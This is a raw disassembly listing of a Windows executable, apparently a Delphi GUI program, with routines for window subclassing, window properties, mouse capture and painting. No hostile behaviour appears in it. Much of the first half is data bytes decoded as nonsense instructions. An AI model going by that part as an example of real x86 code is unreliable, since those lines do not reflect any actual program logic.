add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] eax
push es
dec ebp
popad
inc [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
push r-xdata
inc eax
add [ eax ] al
call [ esi + edi * 8 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
push es
add [ esp + eax * 2 ] cl
jb r-xdata
add [ 0x6f430800 ] cl
outsb
je r-xdata
mov ah 0x46
add [ eax ] bh
clc
inc esp
add [ edi + esi * 8 + 0x10044 ] dl
add [ eax ] al
add [ eax ] al
add [ eax + 0x1fffffff ] al
add al 0x0
pop es
inc edx
imul eax [ ebx + 0x6f ] 0x6c
outsd
jb r-xdata
nop
nop
nop
jo r-xdata
add [ ecx ] 0x0
add [ eax ] al
ja r-xdata
insb
push esi
inc esp
add [ eax ] dh
add [ eax ] al
[ esp + esi * 8 + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] 0x0
add [ eax ] al
pop es
push esi
inc esp
add [ eax ] bh
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al [ eax ]
or [ edi + 0x6e ] cl
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] dh
dec eax
add [ eax + eax ] ch
add [ eax ] al
loopne r-xdata
jae r-xdata
outsb
push ebx
je r-xdata
test [ fs : eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xa0004481
add [ eax + eax + 0x9 ] 0x636f4454
imul ebx [ edx + 0x6f ] 0x6e
dec ecx
insd
popad
jae r-xdata
push eax
mov eax [ eax ]
mov eax [ eax + 0xc ]
xchg [ esp ] eax
retn
nop
nop
int3
inc esp
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc ebx
push 0x65676e61
sbb [ esi + 0x44 ] dl
add [ edx ] al
add bh bh
or al 0xf4
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or edx [ ebx + 0x68 ]
popad
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000a ] al
outsb
insb
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax + 0x9004481 ] ah
push esp
inc esp
outsd
arpl [ ebx + 0x5a ] bp
outsd
outsb
push esi
inc esp
add [ eax + eax ] dh
add bh bh
sbb ah dh
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] 0x0
add [ eax ] al
or al 0x0
add eax 0x74646957
push 0x70909090
pushfd
sub_489e24
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
dec eax
add [ eax + eax ] dh
add [ eax ] al
loopne r-xdata
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
lahf
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
lahf
dec eax
add [ edx + eax ] ah
add [ eax + edx * 4 + 0x48 ] dh
nop
nop
js r-xdata
fcomp [ edi + 0x2640048 ]
add [ eax ] al
je r-xdata
inc esp
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add al al
mov ebp 0x54060049
dec ebp
outsd
jne r-xdata
mov ebx 0xbb9c0049
dec ecx
add [ eax ] ah
mov [ 0xffffffffa5a80049 ] eax
dec ecx
add [ ecx + edi * 4 ] ah
dec ecx
add [ edi - 0x527fffb7 ] dh
dec ecx
add [ eax ] dl
mov esp 0xaa940049
dec ecx
add [ esi + esi * 4 ] ah
dec ecx
add [ eax - 0x66 ] bh
dec ecx
add ah ch
xchg edx eax
dec ecx
add [ esp + 0x49 ] dh
add [ ecx ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x54 ] bp
jb r-xdata
add [ fs : eax + eax + 0x54 ] 0xac004994
xchg esp eax
dec ecx
add [ eax - 0x47 ] dl
dec ecx
add [ esi + edx * 4 ] ch
dec ecx
add [ esi + edx * 4 ] bh
dec ecx
add [ esi + ebx * 4 + 0x49 ] dl
add [ eax + 0x4c0049b9 ] dl
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x62 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add ah bh
jmp 0xffffffff84ac9f00
dec eax
fisttp [ eax ]
adc al 0xea
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add [ eax ] ah
cmovns eax [ eax ]
sub [ edi + 0x49 ] 0x0
nop
fcomp [ esi + 0x48 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_489ebe
inc esp
add [ eax - 0x1d ] cl
inc edx
add [ esp + eax * 4 + 0x44 ] ch
add al bl
cmp ecx [ ecx ]
dec eax
add [ eax + eax + 0x64 ] 0x7c004481
adc [ ecx ] cl
pop esp
jne r-xdata
in al 0xce
dec eax
add [ eax ] ch
or cl [ ecx ]
push esp
or cl [ ecx ]
xor al 0x4c
dec ecx
add [ eax - 0x23 ] ah
dec eax
add [ eax ] bl
ror [ eax ] 0x1
call 0xffffffffd448e81f
jle r-xdata
add [ eax - 0x3fffb6d5 ] al
dec ebp
inc edx
add [ eax + 0x8 ] bl
dec ecx
add [ ebp + 0x12300049 ] dl
dec ecx
add [ eax - 0x23 ] bh
dec eax
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add [ eax ] ah
cmovns eax [ eax ]
sub [ edi + 0x49 ] 0x0
push esp
sub al 0x49
add [ eax + 0x40048e1 ] bl
loopne r-xdata
jae r-xdata
add [ eax + ebp * 2 + 0x49 ] bh
add [ esi + edi + 0x7d080049 ] al
dec ecx
add [ eax - 0x13ffb6cf ] dl
dec ecx
add [ eax + 0x7e ] bl
dec ecx
add ah ah
dec ecx
add [ eax - 0x6fffbb87 ] dl
jns r-xdata
add [ ebp + edi * 2 + 0x687c0049 ] dl
dec ecx
add ah ch
sub ecx [ ecx ]
xchg esp eax
jge r-xdata
add [ eax - 0x1fffb6ca ] ah
into
dec eax
add al bl
or cl [ ecx ]
nop
dec cx
add [ eax + 0x67 ] dl
dec ecx
add [ ecx + 0x67340049 ] dh
dec ecx
add [ eax - 0x1bffb6ee ] ch
sbb eax 0x2d000049
dec ecx
add al al
dec ecx
add al al
sub [ ecx ] ecx
aam 0x27
dec ecx
add [ eax - 0x43ffb6d3 ] bl
sub eax 0x2e500049
dec ecx
add [ esp + ebp + 0x49 ] dl
inc esp
outsd
jae r-xdata
add [ eax - 0x6fffbb87 ] dl
jns r-xdata
test [ eax + eax + 0x48 ] al
jecxz r-xdata
insb
nop
hlt
adc [ ecx ] cl
inc ebx
outsd
outsb
je r-xdata
insb
fcomp [ esi - 0x6b87ffb8 ]
dec eax
add [ eax - 0x6fffbb87 ] dl
jns r-xdata
cmovns eax [ eax ]
sub [ edi + 0x49 ] 0x0
add [ esp + eax * 4 + 0x44 ] ch
add al bl
cmp ecx [ ecx ]
dec eax
add [ eax + eax + 0x64 ] 0x7c004481
in al 0xce
dec eax
add [ eax ] ch
or cl [ ecx ]
push esp
or cl [ ecx ]
xor al 0x4c
dec ecx
add [ eax - 0x23 ] ah
dec eax
add [ eax ] bl
ror [ eax ] 0x1
call 0xffffffffd448e9bf
jle r-xdata
add [ eax - 0x3fffb6d5 ] al
dec ebp
inc edx
add [ eax + 0x8 ] bl
dec ecx
add [ ebp + 0x12300049 ] dl
pop esp
jne r-xdata
outsd
dec ecx
add [ eax ] dh
adc cl [ ecx ]
js r-xdata
outsd
add [ edi ] cl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
add [ eax - 0x6fffbb87 ] dl
jns r-xdata
push esp
sub al 0x49
add [ eax + 0x40048e1 ] bl
loopne r-xdata
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax + edx + 0x49 ] bh
add [ ebp + esi * 2 + 0x49 ] bl
dec eax
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add [ eax ] ah
add ah bh
add [ eax - 0x5f876f70 ] dl
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x48a1 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0x26c0048 ] al
add [ eax ] al
sbb [ esi - 0x7d93ffb8 ] 0x44
add [ edx + eax * 4 + 0x44 ] dh
jb r-xdata
add [ eax - 0x3a ] dh
dec ecx
add [ eax + 0x12004479 ] dl
push esp
inc ebx
jne r-xdata
nop
jns r-xdata
add [ eax + ebp * 2 + 0x49 ] bh
add [ esi + edi + 0x7d080049 ] al
dec ecx
add [ eax - 0x13ffb6cf ] dl
dec ecx
add [ eax + 0x7e ] bl
dec ecx
add ah ah
dec ecx
add [ eax - 0x6fffbb87 ] dl
jns r-xdata
add [ ebp + edi * 2 + 0x687c0049 ] dl
dec ecx
add ah ch
sub ecx [ ecx ]
xchg esp eax
jge r-xdata
add [ eax - 0x1fffb6ca ] ah
into
dec eax
add al bl
or cl [ ecx ]
nop
dec cx
add [ eax + 0x67 ] dl
dec ecx
add [ ecx + 0x67340049 ] dh
dec ecx
add [ eax - 0x1bffb6ee ] ch
sbb eax 0x2d000049
dec ecx
add al al
dec ecx
add al al
sub [ ecx ] ecx
aam 0x27
dec ecx
add [ eax - 0x43ffb6d3 ] bl
sub eax 0x2e500049
dec ecx
add [ esp + ebp + 0x49 ] dl
dec ecx
add [ eax - 0x23 ] bh
xchg esp eax
and eax 0x12300049
insb
jae r-xdata
jmp 0xffffffff84aca0a0
dec esp
test [ eax + eax - 0x4 ] al
je r-xdata
js r-xdata
add [ 0x73754354 ] bl
jb r-xdata
add [ eax - 0x6fffbb87 ] dl
jns r-xdata
add [ esp + eax * 4 + 0x44 ] cl
inc esp
insd
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
jns r-xdata
dec eax
add al dh
lahf
dec eax
add [ edi ] cl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
insd
dec ebp
jne r-xdata
inc edx
insb
nop
nop
test al 0xa1
dec eax
add [ edi ] al
sbb eax 0x73754354
je r-xdata
add [ eax - 0x6fffbb87 ] dl
outsd
add [ eax - 0x6fffbb87 ] dl
jns r-xdata
xchg ebp eax
dec eax
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
outsd
insb
jae r-xdata
add [ fs : eax + eax + 0x4 ] 0x5c00498b
jne r-xdata
or ah [ edx + 0x68 ]
push 0x61745373
outsb
popad
jb r-xdata
add ah bl
mov eax [ 0x620b0048 ]
je r-xdata
add [ eax - 0x23 ] bh
dec eax
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
outsd
insb
jae r-xdata
insd
dec ebp
jne r-xdata
js r-xdata
je r-xdata
insb
arpl [ gs : esp + ecx * 2 + 0x69 ] si
jae r-xdata
add [ eax - 0x3a ] dh
dec ecx
add [ eax - 0x6fffbb87 ] dl
jns r-xdata
add al ah
mov eax [ 0x11030048 ]
push esp
inc edx
popad
in al 0xce
dec eax
add [ eax ] ch
or cl [ ecx ]
push esp
or cl [ ecx ]
xor al 0x4c
dec ecx
add [ eax - 0x23 ] ah
dec eax
add [ eax ] bl
ror [ eax ] 0x1
call 0xffffffffd448ebbf
jle r-xdata
add [ eax - 0x3fffb6d5 ] al
dec ebp
inc edx
add [ eax + 0x8 ] bl
dec ecx
add [ ebp + 0x12300049 ] dl
dec ecx
add [ esp + eax * 4 + 0x44 ] cl
add ah bh
jmp 0xffffffff84aca2a0
popad
push ebx
insb
arpl [ gs : esp + ecx * 2 + 0x69 ] si
jae r-xdata
nop
dec cx
add [ eax + 0x67 ] dl
dec ecx
add al bl
je r-xdata
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add [ eax - 0x36 ] dh
dec ecx
add [ eax - 0x73ffb691 ] al
jne r-xdata
mov [ 0x48 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
mov [ 0xffffffffa3a80048 ] eax
dec eax
add [ eax ] al
jb r-xdata
add [ eax ] al
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x48 ] bl
add [ eax + 0x48a3 ] ch
push ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jbe r-xdata
inc ebx
outsd
outsb
je r-xdata
add [ eax + 0x1d004479 ] dl
push esp
inc ebx
jne r-xdata
push esp
sub al 0x49
add ah ch
sub ecx [ ecx ]
xchg esp eax
jge r-xdata
add [ eax + 0x40048e1 ] bl
loopne r-xdata
jae r-xdata
inc ebx
outsd
outsb
je r-xdata
add [ ecx + 0x67340049 ] dh
dec ecx
add [ eax - 0x1bffb6ee ] ch
sbb eax 0x2d000049
dec ecx
add ah dh
0x49
push eax
dec ecx
add [ edi + ecx * 8 + 0x69b00048 ] bl
dec ecx
add al dl
imul ecx [ ecx ] sub_49663c
insb
insb
insb
outsd
outsd
outsb
dec eax
imul ebp [ esi + 0x74 ] 0x6c797453
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
adc [ edx + eax * 2 + 0x61 ] edx
dec eax
add [ eax - 0x7bffb75d ] dl
add al [ eax ]
add al dl
add [ eax ] al
add [ eax ] al
add [ esi - 0x5d ] dh
outsd
fsub [ ecx + 0x620b0048 ]
je r-xdata
mov esp cs
dec ecx
add [ esp + ecx * 8 - 0x3597ffb7 ] dl
dec ecx
add al bh
add [ eax + ebp * 2 + 0x49 ] bh
add [ ebx + ecx * 4 + 0x49 ] dl
add [ eax ] cl
jge r-xdata
add [ ebp + edi * 2 + 0x687c0049 ] dl
dec ecx
add [ eax - 0x1fffb6ca ] ah
into
dec eax
add al bl
or cl [ ecx ]
insb
insb
outsd
outsd
outsb
or [ ebx + 0x6f ] al
outsb
je r-xdata
outsd
int3
clc
add [ eax - 0x13ffb6cf ] dl
dec ecx
add [ eax + 0x7e ] bl
dec ecx
add ah ah
dec ecx
add [ eax + 0x680049cb ] al

sub_489ff1
lahf
dec eax
add [ edi ] al
adc dl [ ebx + eax * 2 + 0x75 ]
jae r-xdata
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax + edx + 0x49 ] bh
outsd
insd
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
add [ ebp + esi * 2 + 0x49 ] bl
add [ eax - 0x3fffb6d5 ] al
dec ebp
inc edx
add [ eax + 0x8 ] bl
dec ecx
add [ ebp + 0x12300049 ] dl
dec ecx
add [ eax - 0x23 ] bh
dec ecx
insb
fcomp [ esi - 0x6b87ffb8 ]
dec eax
add [ edi ] cl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
dec ecx
add [ eax ] dh
adc cl [ ecx ]
js r-xdata
outsd
insb
jae r-xdata
dec eax
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add [ eax ] ah
cmovns eax [ eax ]
sub [ edi + 0x49 ] 0x0
add [ eax - 0x5f876f70 ] dl
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x48a1 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0x26c0048 ] al
add [ eax ] al
sbb [ esi - 0x7d93ffb8 ] 0x44
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add ah bh
jmp 0xffffffff84aca0a0
sub_48a25e
inc esp
add [ eax - 0x1d ] cl
inc edx
add [ esp + eax * 4 + 0x44 ] ch
add al bl
cmp ecx [ ecx ]
dec eax
add [ eax + eax + 0x64 ] 0x4004481
mov ecx [ ecx ]
pop esp
jne r-xdata
in al 0xce
dec eax
add [ eax ] ch
or cl [ ecx ]
push esp
or cl [ ecx ]
xor al 0x4c
dec ecx
add [ eax - 0x23 ] ah
dec eax
add [ eax ] bl
ror [ eax ] 0x1
call 0xffffffffd448ebbf
jle r-xdata
add [ eax - 0x3fffb6d5 ] al
dec ebp
inc edx
add [ eax + 0x8 ] bl
dec ecx
add [ ebp + 0x12300049 ] dl
dec ecx
add [ eax - 0x23 ] bh
dec eax
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add [ eax - 0x36 ] dh
dec ecx
add [ eax - 0x73ffb691 ] al
jne r-xdata
push esp
sub al 0x49
add ah ch
sub ecx [ ecx ]
xchg esp eax
jge r-xdata
add [ eax + 0x40048e1 ] bl
loopne r-xdata
nop
dec cx
add [ eax + 0x67 ] dl
dec ecx
add al bl
je r-xdata
mov esp cs
dec ecx
add [ esp + ecx * 8 - 0x3597ffb7 ] dl
dec ecx
add al bh
add [ eax + ebp * 2 + 0x49 ] bh
add [ ebx + ecx * 4 + 0x49 ] dl
add [ eax ] cl
jge r-xdata
add [ ebp + edi * 2 + 0x687c0049 ] dl
dec ecx
add [ eax - 0x1fffb6ca ] ah
into
dec eax
add al bl
or cl [ ecx ]
add [ ecx + 0x67340049 ] dh
dec ecx
add [ eax - 0x1bffb6ee ] ch
sbb eax 0x2d000049
dec ecx
add ah dh
0x49
push eax
dec ecx
add [ edi + ecx * 8 + 0x69b00048 ] bl
dec ecx
add al dl
imul ecx [ ecx ] sub_49663c
int3
clc
add [ eax - 0x13ffb6cf ] dl
dec ecx
add [ eax + 0x7e ] bl
dec ecx
add ah ah
dec ecx
add [ eax + 0x680049cb ] al

sub_48a31e
dec ecx
add [ eax - 0x43ffb6d3 ] bl
sub eax 0x2e500049
dec ecx
add [ esp + ebp + 0x49 ] dl
add ah ch
sub ecx [ ecx ]
xchg esp eax
jge r-xdata
mov esp cs
dec ecx
add [ esp + ecx * 8 - 0x3597ffb7 ] dl
dec ecx
add al bh
add [ eax + ebp * 2 + 0x49 ] bh
add [ ebx + ecx * 4 + 0x49 ] dl
add [ eax ] cl
jge r-xdata
int3
clc
add [ eax - 0x13ffb6cf ] dl
dec ecx
add [ eax + 0x7e ] bl
dec ecx
add ah ah
dec ecx
add [ eax + 0x680049cb ] al

sub_48a35a
dec ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah al
push esi
inc esp
add [ eax + 0x2 ] dh
add [ eax ] al
les edx [ esi + 0x44 ]
add [ edx + eax ] dh
add [ eax + eax ] al
test [ eax ] al
test [ eax ] eax
adc dh [ eax - 0x3373fce9 ]
dec ecx
add [ esp + ecx * 8 - 0x3597ffb7 ] dl
dec ecx
add al bh
int3
sub_48a48a
inc esp
add [ eax - 0x1d ] cl
inc edx
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ esi + ecx * 8 + 0x4e900049 ] ch
inc edx
add [ eax ] dl
out 0x42 al
add al al
dec ebp
inc edx
add al bh
out 0x42 al
add [ eax ] dl
iretd
sub_48a5c8
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x24c ] edx
mov eax [ ebp + 0x8 ]
push eax
call IsWindowUnicode
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x250 ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongW
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongW
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x250 ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongW
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongW
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropW
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropW
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x250 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongW
test eax eax
jne r-xdata
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongW
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongW
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongW
jmp r-xdata
sub_48a6d8
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageW
pop edx
pop ebx
retn
sub_48a70c
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_449db8
push eax
call GlobalFindAtomW
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_48a6d8
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropW
mov esi eax
jmp r-xdata
sub_48a768
push ebx
mov ebx eax
mov eax ebx
call sub_48a70c
test eax eax
setne al
test al al
jne r-xdata
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call [ rw-data ]
sub_48a798
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x170 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageW
pop esi
pop ebx
retn
sub_48aa9c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_43b058
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_44a368
mov eax edi
mov edx esi
call sub_449d2c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_48aae4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_43b058
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_44a368
mov eax edi
mov edx esi
call sub_449d2c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_48ab2c
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
add eax [ esi + 0x44 ]
push eax
mov eax [ esp + 0x8 ]
add eax [ esi + 0x40 ]
push eax
push ebx
call SetWindowOrgEx
push ebx
mov ecx ebx
mov edx 0x14
mov eax [ esi + 0x30 ]
call sub_48f2b0
push 0x0
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop esi
pop ebx
retn
sub_48ab7c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_48ac23
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0xc ]
push eax
mov edx ebx
mov ecx 0x2
mov eax [ ebp - 0x8 ]
call sub_41d6cc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_48ac01
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x4
mov eax [ ebp - 0xc ]
push eax
push 0x318
mov eax [ ebp - 0x4 ]
push eax
call SendMessageW
mov edx ebx
mov cl 0xff
mov eax [ ebp - 0x10 ]
call sub_41d7e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48ac08
or edx 0xffffffff
mov eax [ ebp - 0x10 ]
call sub_41d76c
retn
sub_48ac58
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
jne r-xdata
mov eax ebx
call sub_496868
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_48ad10
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebp edx
mov esi eax
xor eax eax
mov [ edi ] eax
xor ebx ebx
jmp r-xdata
mov eax [ edi ]
cmp eax [ esi + 0x8 ]
jl r-xdata
mov edx [ edi ]
mov eax esi
call sub_4246e8
cmp ebp [ eax + 0x4 ]
sete bl
test bl bl
jne r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ edi ]
sub_48ad48
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_496868
mov ebx eax
mov esi ebx
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn
mov esi ebx
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_48ad74
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_44748c
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_48ad48
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_48ad10
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_424590
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4246e8
mov edi eax
mov eax [ edi ]
call sub_496868
push eax
mov eax [ ebx ]
call sub_496868
push eax
call IsChild
test eax eax
je r-xdata
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_424768
jmp r-xdata
inc [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_48adf8
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_4245c4
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4246e8
mov edx 0x8
call sub_4474a8
inc esi
dec ebx
jne r-xdata
sub_48ae2c
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_4246e8
mov edi [ eax ]
